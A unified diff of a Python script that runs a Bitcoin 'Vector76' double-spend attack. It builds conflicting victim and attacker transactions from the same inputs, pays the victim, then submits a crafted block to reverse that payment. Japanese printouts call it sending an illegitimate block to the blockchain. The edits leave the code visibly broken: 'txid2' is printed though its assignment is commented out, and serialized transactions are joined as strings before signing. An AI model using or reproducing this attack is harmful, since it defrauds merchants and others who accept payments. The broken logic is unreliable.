@@ -108,21 +108,19 @@ if balance < send_amount:
     print(f"[!] insufficient funds. ")
     exit()
 
-fee = 15000
-change_btc_amt = (balance - send_amount) - fee#おつり
-
-
+fee = 10000
 
 tx_victim   = [{"address": victim_address, "value": send_amount}]
 tx_attacker = [{"address": attacker_address, "value": send_amount}]
 
 tx_victim   = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
 tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee)
+
 tx_victim   = cryptos.serialize(transaction_util.signall(tx_victim, fake_send_from))
 tx_attacker = cryptos.serialize(transaction_util.signall(tx_attacker, fake_send_from))
-vector76_block = f"{tx_attacker}{tx_victim}"#[tx_attacker[0], tx_victim[0]]
-#vector76_block = transaction_util.mktx_with_change(inputs, vector76_block, fee=fee)
-vector76_block = cryptos.serialize(transaction_util.signall(vector76_block, fake_send_from))
+
+vector76 = f"{tx_victim}{tx_attacker}"
+vector76_block   = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
 
 print()
 print("[+] READY...")
@@ -138,32 +136,30 @@ print(f"Testnet Mode              : {testnet}")
 print("--------------------")
 print()
 print()
-print(f"Generating Vector76 Block")
-#send_rawtransaction(vector76_block)
-generated_vector76_block = generate_block(attacker_address, vector76_block)["hex"]
-
+#print(f"Generating Vector76 Block")
+#send_rawtransaction(tx_attacker)
+#generated_vector76_block = generate_block(attacker_address, tx_attacker)["hex"]
+print()
 input("--- Are you sure you want to continue? Press Enter to continue. ---")
-print()
-print("Sending V1 Transaction to victim...")
-transaction_util.pushtx(tx_victim)
-print()
-print("OK")
+print("Sending V1 Transaction ...")
+txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount)
+print(txid)
 print()
 input("--- Send the vector76 lock after pressing the enter key. --- ")
 print()
 print()
 print("Index > 強固なブロックチェーン技術に対して強制干渉を開始...")
 print()
-time.sleep(1) #..... -u-
-
+time.sleep(0.7)
 print("SND IBLK TOBC  (不正なブロックを、ブロックチェーンに送信!)")
 print()
-try:
-    transaction_util.pushtx(generated_vector76_block)
-except:
-    pass
-
-submit_block(generated_vector76_block)
+#transaction_util.pushtx(vector76_block)
+generate_block(transaction_util.wiftoaddr(fake_send_from), vector76_block, True)
+print("Sending V2 Transaction ...")
+print()
+#txid2 = transaction_util.pushtx(tx_attacker)
+print(txid2)
+print("OK")
 
 print()
 #おまけ
